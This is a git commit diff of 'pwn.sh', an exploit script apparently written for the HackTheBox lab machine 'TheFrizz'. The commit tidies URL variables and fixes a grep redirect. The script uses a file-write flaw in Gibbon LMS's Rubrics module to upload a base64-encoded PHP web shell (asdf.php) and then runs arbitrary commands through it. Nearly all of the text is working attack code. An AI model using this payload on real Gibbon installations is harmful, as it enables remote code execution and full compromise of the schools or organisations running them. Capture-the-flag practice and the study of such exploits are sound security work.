9b657050a7e498464741c84bc34b7b35e0ed2b8a
Benjamin Heater <benheater@gmail.com>
2025-03-20 01:31:16 -0400

    Update pwn.sh

--- HackTheBox/TheFrizz/pwn.sh
+++ HackTheBox/TheFrizz/pwn.sh
@@ -13,12 +13,13 @@ else
 
     COMMAND="${@:1}"
     URL_ENCODED_COMMAND=$(echo -n "$COMMAND" | jq -SRr @uri)
-    RCE='http://frizzdc.frizz.htb/Gibbon-LMS/asdf.php'
-    VULNERABLE_URL='http://frizzdc.frizz.htb/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php'
+    BASE_URL='http://frizzdc.frizz.htb/Gibbon-LMS'
+    RCE="${BASE_URL}/asdf.php"
+    VULNERABLE_URL="${BASE_URL}/modules/Rubrics/rubrics_visualise_saveAjax.php"
     PAYLOAD='img=image/png;asdf,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKT8%2b&path=asdf.php&gibbonPersonID=0000000001'
 
     # Ensure the file has not been wiped
-    if ! curl -sI "$RCE" | grep 'HTTP/1.1 200 OK > /dev/null'; then
+    if ! curl -sI "$RCE" | grep 'HTTP/1.1 200 OK' > /dev/null; then
         curl -si "$VULNERABLE_URL" -d "$PAYLOAD" >/dev/null
     fi
 
